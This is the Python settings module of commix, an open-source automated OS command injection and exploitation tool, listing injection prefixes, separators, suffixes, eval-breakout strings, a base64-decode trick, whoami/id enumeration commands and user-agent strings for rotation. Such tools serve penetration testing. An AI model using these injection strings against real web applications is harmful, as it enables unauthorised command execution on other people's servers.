#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'doc/COPYING' for copying permission.
"""

import sys
import os
import urllib

"""
 The global variables.
"""

# About
APPLICATION = "commix"
DESCRIPTION = "Automated All-in-One OS Command Injection and Exploitation Tool"
AUTHOR  = "Anastasios Stasinopoulos"
VERSION = "v0.1b"
YEAR    = "2015"
TWITTER = "@ancst" 

# Inject Tag
INJECT_TAG = "INJECT_HERE"

# Check Commit ID
if os.path.isdir("./.git"):
  with open('.git/refs/heads/master', 'r') as f:
    COMMIT_ID = "-" + f.readline()[0:7]
else:
    COMMIT_ID = ""
    
# Output Directory
OUTPUT_DIR = ".output/"
dir = os.path.dirname(OUTPUT_DIR)
try:
    os.stat(OUTPUT_DIR)
except:
    os.mkdir(OUTPUT_DIR)       

# The base64 decode trick
B64_DEC_TRICK = " | base64 -d "

# The command injection prefixes.
PREFIXES = ["","|","&","%7C","%26"] 

# The command injection separators.
SEPARATORS = ["",";","&","|","||","&&","%0a","%3B","%26","%26%26","%7C","%7C%7C"]

# The command injection suffixes.
SUFFIXES = ["","#","//","\\\\","&","|","%5C%5C","%2F%2F","%26","%7C"]

# Bad combination of prefix and separator
JUNK_COMBINATION = ["&&&","|||","|&&","&|","&;","|;","%7C;","%26;","%7C&"]

# The code injection prefixes.
EVAL_PREFIXES = ["","'",")","')","\")","\".","'.",");}","');}","\");}"]

# The code injection separators.
EVAL_SEPARATORS = ["",";"]

# The code injection suffixes.
EVAL_SUFFIXES = ["","\\\\","//","#",".\"",".'"]

# The white-spaces
WHITESPACES = ["%20","$IFS"]

# Time delay
DELAY = 1

# Default Temp Directorya
TMP_PATH = "/tmp/"

# Default Server's Root Directory
SRV_ROOT_DIR = "/var/www/"

# The max help option length.
MAX_OPTION_LENGTH = 18

# Python version.
PYTHON_VERSION = sys.version.split()[0]

# Enumeration Commands
CURRENT_USER = "whoami"
HOSTNAME = "hostname"
ISROOT = "echo $(id -u)"

#Accepts yes or y or YES or Y but no enter, just in case user made a mistake of pressing enter.
#YES or Y added to avoid confusion between case sensitive and case insensitive
CHOISE_YES = set(['yes','y', 'YES', 'Y'])

# Available injectipon techniques
AVAILABLE_TECHNIQUES = set(["classic","eval-based","time-based","file-based"])

# User Agent List
USER_AGENT_LIST = [
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/31.0",
	"Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
	"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/31.0",
        # Oldies 
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
	#Chrome 41.0.2228.0
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
]
